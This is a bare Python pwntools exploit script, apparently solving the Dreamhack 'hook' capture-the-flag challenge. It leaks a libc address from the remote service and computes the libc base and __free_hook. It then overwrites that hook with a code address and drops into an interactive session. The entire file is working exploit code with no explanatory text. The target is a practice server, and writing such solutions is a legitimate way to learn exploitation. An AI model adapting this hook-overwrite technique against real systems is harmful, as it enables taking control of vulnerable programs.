from pwn import *
context.log_level = 'debug'
context.arch = "amd64"
def slog(name, addr):	return success(": ".join([name, hex(addr)]))

# Local
"""
p = process("./hook")
libc = ELF("./libc.so.6")
"""

# Online
PORT = int(input("Port: "))
HOST = int(input("Host: "))
p = remote("host" + str(HOST) + ".dreamhack.games", PORT)
libc = ELF("./libc.so.6")

elf = ELF("./hook")

p.recvuntil("stdout: ")
stdout_addr = int(p.recv(14), 16)
slog("stdout_addr", stdout_addr)
libc_base = stdout_addr - libc.symbols["_IO_2_1_stdout_"]
free_hook = libc_base + libc.symbols["__free_hook"]
slog("libc_base", libc_base)
slog("free_hook", free_hook)

p.recvuntil("Size: ")
p.sendline("400")
p.recvuntil("Data: ")
p.sendline(p64(free_hook) + p64(0x400a11))

p.interactive()
